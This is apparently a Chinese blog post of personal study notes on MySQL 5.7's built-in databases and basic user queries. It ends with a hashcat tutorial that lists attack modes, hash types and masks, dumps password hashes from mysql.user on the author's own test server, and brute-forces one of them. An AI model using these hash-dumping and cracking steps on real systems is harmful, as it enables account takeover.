<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565753734023.png" alt="1565753734023"></p>
<p>默认有information_schema、mysql、performance_schema、security、sys 5个数据库（version5.7.27），</p>
<h5 id="2-1-1-information-schema库"><a href="#2-1-1-information-schema库" class="headerlink" title="2.1.1.information_schema库"></a>2.1.1.information_schema库</h5><p>​         在mysql中把information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件 。 </p>
<p>+—————————————+<br>| Tables_in_information_schema          |<br>+—————————————+<br>| CHARACTER_SETS                        |<br>| COLLATIONS                            |<br>| COLLATION_CHARACTER_SET_APPLICABILITY |<br>| COLUMNS                               |<br>| COLUMN_PRIVILEGES                     |<br>| ENGINES                               |<br>| EVENTS                                |<br>| FILES                                 |<br>| GLOBAL_STATUS                         |<br>| GLOBAL_VARIABLES                      |<br>| KEY_COLUMN_USAGE                      |<br>| OPTIMIZER_TRACE                       |<br>| PARAMETERS                            |<br>| PARTITIONS                            |<br>| PLUGINS                               |<br>| PROCESSLIST                           |<br>| PROFILING                             |<br>| REFERENTIAL_CONSTRAINTS               |<br>| ROUTINES                              |<br>| SCHEMATA                              |<br>| SCHEMA_PRIVILEGES                     |<br>| SESSION_STATUS                        |<br>| SESSION_VARIABLES                     |<br>| STATISTICS                            |<br>| TABLES                                |<br>| TABLESPACES                           |<br>| TABLE_CONSTRAINTS                     |<br>| TABLE_PRIVILEGES                      |<br>| TRIGGERS                              |<br>| USER_PRIVILEGES                       |<br>| VIEWS                                 |<br>| INNODB_LOCKS                          |<br>| INNODB_TRX                            |<br>| INNODB_SYS_DATAFILES                  |<br>| INNODB_FT_CONFIG                      |<br>| INNODB_SYS_VIRTUAL                    |<br>| INNODB_CMP                            |<br>| INNODB_FT_BEING_DELETED               |<br>| INNODB_CMP_RESET                      |<br>| INNODB_CMP_PER_INDEX                  |<br>| INNODB_CMPMEM_RESET                   |<br>| INNODB_FT_DELETED                     |<br>| INNODB_BUFFER_PAGE_LRU                |<br>| INNODB_LOCK_WAITS                     |<br>| INNODB_TEMP_TABLE_INFO                |<br>| INNODB_SYS_INDEXES                    |<br>| INNODB_SYS_TABLES                     |<br>| INNODB_SYS_FIELDS                     |<br>| INNODB_CMP_PER_INDEX_RESET            |<br>| INNODB_BUFFER_PAGE                    |<br>| INNODB_FT_DEFAULT_STOPWORD            |<br>| INNODB_FT_INDEX_TABLE                 |<br>| INNODB_FT_INDEX_CACHE                 |<br>| INNODB_SYS_TABLESPACES                |<br>| INNODB_METRICS                        |<br>| INNODB_SYS_FOREIGN_COLS               |<br>| INNODB_CMPMEM                         |<br>| INNODB_BUFFER_POOL_STATS              |<br>| INNODB_SYS_COLUMNS                    |<br>| INNODB_SYS_FOREIGN                    |<br>| INNODB_SYS_TABLESTATS                 |<br>+—————————————+</p>
<p><strong>SCHEMATA表</strong>：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from schemata;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565833986657.png" alt="1565833986657"></p>
<p><strong>TABLES表：</strong>提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565834067784.png" alt="1565834067784"></p>
<p><strong>COLUMNS表：</strong>提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</p>
<p>STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565834129667.png" alt="1565834129667"><strong>USER_PRIVILEGES（用户权限）</strong>：给出了关于全程权限的信息，该信息源自mysql.user授权表(非标准表)。 </p>
<p>SCHEMA_PRIVILEGES（方案权限）：给出了关于方案（数据库）权限的信息，该信息来自mysql.db授权表(非标准表)。<br>TABLE_PRIVILEGES（表权限）：给出了关于表权限的信息，该信息源自mysql.tables_priv授权表(非标准表)。<br>COLUMN_PRIVILEGES（列权限）：给出了关于列权限的信息，该信息源自mysql.columns_priv授权表(非标准表)。<br>CHARACTER_SETS（字符集）：提供了mysql实例可用字符集的信息，SHOW CHARACTER SET结果集取之此表。<br>COLLATIONS：提供了关于各字符集的对照信息。<br>COLLATION_CHARACTER_SET_APPLICABILITY：指明了可用于校对的字符集，这些列等效于SHOW COLLATION的前两个显示字段。<br>TABLE_CONSTRAINTS：描述了存在约束的表，以及表的约束类型。<br>KEY_COLUMN_USAGE：描述了具有约束的键列。<br>ROUTINES：提供了关于存储子程序（存储程序和函数）的信息，此时，ROUTINES表不包含自定义函数（UDF），名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。<br>VIEWS：给出了关于数据库中的视图的信息，需要有show views权限，否则无法查看视图信息。<br>TRIGGERS：提供了关于触发程序的信息，必须有super权限才能查看该表。</p>
<h5 id="2-1-2-mysql库"><a href="#2-1-2-mysql库" class="headerlink" title="2.1.2 mysql库"></a>2.1.2 mysql库</h5><p>​     mysql的核心数据库，类似于sql server中的master表，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的控制和管理信息。(常用的，在mysql.user表中修改root用户的密码)。</p>
<p>+—————————+<br>| Tables_in_mysql           |<br>+—————————+<br>| columns_priv              |<br>| db                        |<br>| engine_cost               |<br>| event                     |<br>| func                      |<br>| general_log               |<br>| gtid_executed             |<br>| help_category             |<br>| help_keyword              |<br>| help_relation             |<br>| help_topic                |<br>| innodb_index_stats        |<br>| innodb_table_stats        |<br>| ndb_binlog_index          |<br>| plugin                    |<br>| proc                      |<br>| procs_priv                |<br>| proxies_priv              |<br>| server_cost               |<br>| servers                   |<br>| slave_master_info         |<br>| slave_relay_log_info      |<br>| slave_worker_info         |<br>| slow_log                  |<br>| tables_priv               |<br>| time_zone                 |<br>| time_zone_leap_second     |<br>| time_zone_name            |<br>| time_zone_transition      |<br>| time_zone_transition_type |<br>| user                      |<br>+—————————+</p>
<h5 id="2-1-3-performance-schema"><a href="#2-1-3-performance-schema" class="headerlink" title="2.1.3 performance_schema"></a>2.1.3 <strong>performance_schema</strong></h5><p>​      主要用于收集数据库服务器性能参数。并且库里表的存储引擎均为PERFORMANCE_SCHEMA，而用户是不能创建存储引擎为PERFORMANCE_SCHEMA的表。</p>
<p>参考链接：<a href="https://www.cnblogs.com/zhoujinyi/p/5236705.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhoujinyi/p/5236705.html</a></p>
<h5 id="2-1-4-sys库"><a href="#2-1-4-sys库" class="headerlink" title="2.1.4 sys库"></a>2.1.4 <em>sys</em>库</h5><p>​      Sys库所有的数据源来自：performance_schema。目标是把performance_schema的把复杂度降低，让DBA能更好的阅读这个库里的内容。让DBA更快的了解DB的运行情况。 </p>
<p>参考链接：<a href="https://blog.csdn.net/yanzongshuai/article/details/73441158" target="_blank" rel="noopener">https://blog.csdn.net/yanzongshuai/article/details/73441158</a></p>
<h5 id="2-1-5-简单查询库、表、字段名、内容用户信息等"><a href="#2-1-5-简单查询库、表、字段名、内容用户信息等" class="headerlink" title="2.1.5 简单查询库、表、字段名、内容用户信息等"></a>2.1.5 简单查询库、表、字段名、内容用户信息等</h5><p>查询库：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565877136292.png" alt="1565877136292"></p>
<p>查询表：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565877298753.png" alt="1565877298753"></p>
<p>查询用户信息：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565877342498.png" alt="1565877342498"></p>
<p>查看现有用户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host,user,authentication_string from mysql.user;</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565877431764.png" alt="1565877431764"></p>
<p>新建用户：</p>
<p><strong>create user “username”@”host” identified by “password”;</strong>（  /<em>host=”localhost”为本地登录用户，host=”ip”为ip地址登录，host=”%”，为外网ip登录</em>/）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create user &apos;test&apos;@&apos;localhost&apos; identified by &apos;123&apos;;(创建一个用户进行本地登录)</span><br></pre></td></tr></table></figure>

<p>产生错误信息：</p>
<p>ERROR 1290 (HY000): The MySQL server is running with the –skip-grant-tables option so it cannot execute this statement</p>
<p>需执行 flush privileges;  如下</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565878084161.png" alt="1565878084161"></p>
<h5 id="2-1-6-使用hashcat暴力破解用户哈希值"><a href="#2-1-6-使用hashcat暴力破解用户哈希值" class="headerlink" title="2.1.6  使用hashcat暴力破解用户哈希值"></a>2.1.6  使用hashcat暴力破解用户哈希值</h5><h5 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-a  指定要使用的破解模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。</span><br><span class="line">-m  指定要破解的hash类型，如果不指定类型，则默认是MD5</span><br><span class="line">-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</span><br><span class="line">--force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</span><br><span class="line">--show  显示已经破解的hash及该hash所对应的明文</span><br><span class="line">--increment  启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程</span><br><span class="line">--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</span><br><span class="line">--increment-max  密码最大长度,同上</span><br><span class="line">--outfile-format 指定破解结果的输出格式id,默认是3</span><br><span class="line">--username   忽略hash文件中的指定的用户名,在破解linux系统用户密码hash可能会用到</span><br><span class="line">--remove     删除已被破解成功的hash</span><br><span class="line">-r       使用自定义破解规则</span><br></pre></td></tr></table></figure>

<h5 id="攻击模式："><a href="#攻击模式：" class="headerlink" title="攻击模式："></a>攻击模式：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># | Mode</span><br><span class="line"> ===+======</span><br><span class="line">  0 | Straight（字段破解）</span><br><span class="line">  1 | Combination（组合破解）</span><br><span class="line">  3 | Brute-force（掩码暴力破解）</span><br><span class="line">  6 | Hybrid Wordlist + Mask（字典+掩码破解）</span><br><span class="line">  7 | Hybrid Mask + Wordlist（掩码+字典破解）</span><br></pre></td></tr></table></figure>

<h5 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1 = hash[:salt]</span><br><span class="line">2 = plain</span><br><span class="line">3 = hash[:salt]:plain</span><br><span class="line">4 = hex_plain</span><br><span class="line">5 = hash[:salt]:hex_plain</span><br><span class="line">6 = plain:hex_plain</span><br><span class="line">7 = hash[:salt]:plain:hex_plain</span><br><span class="line">8 = crackpos</span><br><span class="line">9 = hash[:salt]:crackpos</span><br><span class="line">10 = plain:crackpos</span><br><span class="line">11 = hash[:salt]:plain:crackpos</span><br><span class="line">12 = hex_plain:crackpos</span><br><span class="line">13 = hash[:salt]:hex_plain:crackpos</span><br><span class="line">14 = plain:hex_plain:crackpos</span><br><span class="line">15 = hash[:salt]:plain:hex_plain:crackpos</span><br></pre></td></tr></table></figure>

<h5 id="Hash-ID对照表："><a href="#Hash-ID对照表：" class="headerlink" title="Hash  ID对照表："></a>Hash  ID对照表：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">- [ Hash modes ] -</span><br><span class="line"></span><br><span class="line">      # | Name                                             | Category</span><br><span class="line">  ======+==================================================+======================================</span><br><span class="line">    900 | MD4                                              | Raw Hash</span><br><span class="line">      0 | MD5                                              | Raw Hash</span><br><span class="line">   5100 | Half MD5                                         | Raw Hash</span><br><span class="line">    100 | SHA1                                             | Raw Hash</span><br><span class="line">   1300 | SHA2-224                                         | Raw Hash</span><br><span class="line">   1400 | SHA2-256                                         | Raw Hash</span><br><span class="line">  10800 | SHA2-384                                         | Raw Hash</span><br><span class="line">   1700 | SHA2-512                                         | Raw Hash</span><br><span class="line">  17300 | SHA3-224                                         | Raw Hash</span><br><span class="line">  17400 | SHA3-256                                         | Raw Hash</span><br><span class="line">  17500 | SHA3-384                                         | Raw Hash</span><br><span class="line">  17600 | SHA3-512                                         | Raw Hash</span><br><span class="line">     10 | md5($pass.$salt)                                 | Raw Hash, Salted and/or Iterated</span><br><span class="line">     20 | md5($salt.$pass)                                 | Raw Hash, Salted and/or Iterated</span><br><span class="line">     30 | md5(utf16le($pass).$salt)                        | Raw Hash, Salted and/or Iterated</span><br><span class="line">     40 | md5($salt.utf16le($pass))                        | Raw Hash, Salted and/or Iterated</span><br><span class="line">   3800 | md5($salt.$pass.$salt)                           | Raw Hash, Salted and/or Iterated</span><br><span class="line">   3710 | md5($salt.md5($pass))                            | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4010 | md5($salt.md5($salt.$pass))                      | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4110 | md5($salt.md5($pass.$salt))                      | Raw Hash, Salted and/or Iterated</span><br><span class="line">   2600 | md5(md5($pass))                                  | Raw Hash, Salted and/or Iterated</span><br><span class="line">   3910 | md5(md5($pass).md5($salt))                       | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4300 | md5(strtoupper(md5($pass)))                      | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4400 | md5(sha1($pass))                                 | Raw Hash, Salted and/or Iterated</span><br><span class="line">    110 | sha1($pass.$salt)                                | Raw Hash, Salted and/or Iterated</span><br><span class="line">    120 | sha1($salt.$pass)                                | Raw Hash, Salted and/or Iterated</span><br><span class="line">    130 | sha1(utf16le($pass).$salt)                       | Raw Hash, Salted and/or Iterated</span><br><span class="line">    140 | sha1($salt.utf16le($pass))                       | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4500 | sha1(sha1($pass))                                | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4520 | sha1($salt.sha1($pass))                          | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4700 | sha1(md5($pass))                                 | Raw Hash, Salted and/or Iterated</span><br><span class="line">   4900 | sha1($salt.$pass.$salt)                          | Raw Hash, Salted and/or Iterated</span><br><span class="line">  14400 | sha1(CX)                                         | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1410 | sha256($pass.$salt)                              | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1420 | sha256($salt.$pass)                              | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1430 | sha256(utf16le($pass).$salt)                     | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1440 | sha256($salt.utf16le($pass))                     | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1710 | sha512($pass.$salt)                              | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1720 | sha512($salt.$pass)                              | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1730 | sha512(utf16le($pass).$salt)                     | Raw Hash, Salted and/or Iterated</span><br><span class="line">   1740 | sha512($salt.utf16le($pass))                     | Raw Hash, Salted and/or Iterated</span><br><span class="line">  14000 | DES (PT = $salt, key = $pass)                    | Raw Cipher, Known-Plaintext attack</span><br><span class="line">  14100 | 3DES (PT = $salt, key = $pass)                   | Raw Cipher, Known-Plaintext attack</span><br><span class="line">  14900 | Skip32 (PT = $salt, key = $pass)                 | Raw Cipher, Known-Plaintext attack</span><br><span class="line">  15400 | ChaCha20                                         | Raw Cipher, Known-Plaintext attack</span><br><span class="line">   2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols</span><br><span class="line">   2501 | WPA-EAPOL-PMK                                    | Network Protocols</span><br><span class="line">  16800 | WPA-PMKID-PBKDF2                                 | Network Protocols</span><br><span class="line">  16801 | WPA-PMKID-PMK                                    | Network Protocols</span><br><span class="line">   7300 | IPMI2 RAKP HMAC-SHA1                             | Network Protocols</span><br><span class="line">   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols</span><br><span class="line">   8300 | DNSSEC (NSEC3)                                   | Network Protocols</span><br><span class="line">  10200 | CRAM-MD5                                         | Network Protocols</span><br><span class="line">  11100 | PostgreSQL CRAM (MD5)                            | Network Protocols</span><br><span class="line">  11200 | MySQL CRAM (SHA1)                                | Network Protocols</span><br><span class="line">  16100 | TACACS+                                          | Network Protocols</span><br><span class="line">  16500 | JWT (JSON Web Token)                             | Network Protocols</span><br><span class="line">    121 | SMF (Simple Machines Forum) &gt; v1.1               | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">    400 | phpBB3 (MD5)                                     | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">   2811 | MyBB 1.2+                                        | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">   2811 | IPB2+ (Invision Power Board)                     | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">   8400 | WBB3 (Woltlab Burning Board)                     | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">     11 | Joomla &lt; 2.5.18                                  | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">    400 | Joomla &gt;= 2.5.18 (MD5)                           | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">    400 | WordPress (MD5)                                  | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">   2612 | PHPS                                             | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">   7900 | Drupal7                                          | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">     21 | osCommerce                                       | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">     21 | xt:Commerce                                      | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">  11000 | PrestaShop                                       | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">    124 | Django (SHA-1)                                   | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">  10000 | Django (PBKDF2-SHA256)                           | Forums, CMS, E-Commerce, Frameworks</span><br><span class="line">     12 | PostgreSQL                                       | Database Server</span><br><span class="line">    131 | MSSQL (2000)                                     | Database Server</span><br><span class="line">    132 | MSSQL (2005)                                     | Database Server</span><br><span class="line">   1731 | MSSQL (2012, 2014)                               | Database Server</span><br><span class="line">    200 | MySQL323                                         | Database Server</span><br><span class="line">    300 | MySQL4.1/MySQL5                                  | Database Server</span><br><span class="line">   3100 | Oracle H: Type (Oracle 7+)                       | Database Server</span><br><span class="line">    112 | Oracle S: Type (Oracle 11+)                      | Database Server</span><br><span class="line">  12300 | Oracle T: Type (Oracle 12+)                      | Database Server</span><br><span class="line">   8000 | Sybase ASE                                       | Database Server</span><br><span class="line">  15000 | FileZilla Server &gt;= 0.9.55                       | FTP Server</span><br><span class="line">  11500 | CRC32                                            | Checksums</span><br><span class="line">   3000 | LM                                               | Operating Systems</span><br><span class="line">   1000 | NTLM                                             | Operating Systems</span><br><span class="line">    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | Operating Systems</span><br><span class="line">   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating Systems</span><br><span class="line">   7400 | sha256crypt $5$, SHA256 (Unix)                   | Operating Systems</span><br><span class="line">   1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating Systems</span><br><span class="line">    122 | macOS v10.4, MacOS v10.5, MacOS v10.6            | Operating Systems</span><br><span class="line">   1722 | macOS v10.7                                      | Operating Systems</span><br><span class="line">   7100 | macOS v10.8+ (PBKDF2-SHA512)                     | Operating Systems</span><br><span class="line">  11600 | 7-Zip                                            | Archives</span><br><span class="line">  12500 | RAR3-hp                                          | Archives</span><br><span class="line">  13000 | RAR5                                             | Archives</span><br><span class="line">  13600 | WinZip                                           | Archives</span><br><span class="line">   9700 | MS Office &lt;= 2003 $0/$1, MD5 + RC4               | Documents</span><br><span class="line">   9710 | MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #1  | Documents</span><br><span class="line">   9720 | MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #2  | Documents</span><br><span class="line">   9800 | MS Office &lt;= 2003 $3/$4, SHA1 + RC4              | Documents</span><br><span class="line">   9810 | MS Office &lt;= 2003 $3, SHA1 + RC4, collider #1    | Documents</span><br><span class="line">   9820 | MS Office &lt;= 2003 $3, SHA1 + RC4, collider #2    | Documents</span><br><span class="line">   9400 | MS Office 2007                                   | Documents</span><br><span class="line">   9500 | MS Office 2010                                   | Documents</span><br><span class="line">   9600 | MS Office 2013                                   | Documents</span><br><span class="line">  10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | Documents</span><br><span class="line">  10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | Documents</span><br><span class="line">  10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | Documents</span><br><span class="line">  10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | Documents</span><br><span class="line">  10600 | PDF 1.7 Level 3 (Acrobat 9)                      | Documents</span><br><span class="line">  10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | Documents</span><br><span class="line">  99999 | Plaintext                                        | Plaintext</span><br></pre></td></tr></table></figure>

<h5 id="掩码设置："><a href="#掩码设置：" class="headerlink" title="掩码设置："></a>掩码设置：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">l | abcdefghijklmnopqrstuvwxyz          纯小写字母</span><br><span class="line">u | ABCDEFGHIJKLMNOPQRSTUVWXYZ          纯大写字母</span><br><span class="line">d | 0123456789                  纯数字</span><br><span class="line">h | 0123456789abcdef                常见小写子目录和数字</span><br><span class="line">H | 0123456789ABCDEF                常见大写字母和数字</span><br><span class="line">s |  !&quot;#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~       特殊字符</span><br><span class="line">a | ?l?u?d?s                    键盘上所有可见的字符</span><br><span class="line">b | 0x00 - 0xff                 可能是用来匹配像空格这种密码的</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">八位数字密码：?d?d?d?d?d?d?d?d</span><br><span class="line">八位未知密码：?a?a?a?a?a?a?a?a</span><br><span class="line">前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d</span><br><span class="line">前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H</span><br><span class="line">前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a</span><br><span class="line">6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l</span><br><span class="line">6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h</span><br></pre></td></tr></table></figure>

<p>查询test用户哈希值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host,user,authentication_string from mysql.user;</span><br></pre></td></tr></table></figure>

<p>+———–+—————+——————————————-+<br>| host      | user          | authentication_string                     |<br>+———–+—————+——————————————-+<br>| %         | admin         | *CEC3498F67987AEBE2EAD1315A7C74D07B13D4C4 |<br>| localhost | mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |<br>| localhost | mysql.sys     | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |<br>| localhost | test          | *23AE809DDACAF96AF0FD78ED04B6A265E05AA257 |<br>+———–+—————+——————————————-+</p>
<p>查看下加密类型：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565882060259.png" alt="1565882060259"></p>
<h5 id="进行破解："><a href="#进行破解：" class="headerlink" title="进行破解："></a>进行破解：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 300 --force 23AE809DDACAF96AF0FD78ED04B6A265E05AA257 ?d?d?d</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565917746029.png" alt="1565917746029"></p>
<h5 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h5><p>hashcat使用：</p>
<p><a href="https://xz.aliyun.com/t/4008" target="_blank" rel="noopener">https://xz.aliyun.com/t/4008</a></p>
<p>关于SQL注入中文件读写的方法总结：</p>
<p><a href="https://www.jb51.net/article/108979.htm" target="_blank" rel="noopener">https://www.jb51.net/article/108979.htm</a></p>
<p>mysql 5.7.22 自带的四个数据库介绍：</p>
<p><a href="https://blog.csdn.net/cainiao000001/article/details/80502549" target="_blank" rel="noopener">https://blog.csdn.net/cainiao000001/article/details/80502549</a></p>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/19/数据库学习-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
